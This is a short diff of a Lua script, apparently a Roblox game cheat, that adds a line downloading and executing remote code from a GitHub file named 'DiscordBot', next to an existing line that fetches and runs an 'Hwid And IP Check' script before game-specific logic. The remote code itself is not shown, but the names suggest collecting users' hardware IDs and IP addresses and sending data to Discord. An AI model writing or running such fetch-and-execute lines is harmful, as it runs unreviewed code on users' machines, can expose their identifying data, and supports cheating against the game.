@@ -21,6 +21,7 @@ for _, data in ipairs(storedData) do
     end
 end
 loadstring(game:HttpGet("https://raw.githubusercontent.com/XeQpeQ/Hashira/main/Hwid%20And%20IP%20Check", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XeQpeQ/Hashira/main/DiscordBot", true))()
 if isAllowed then
     -- Dungeon
  if game.PlaceId == 11468075017 then
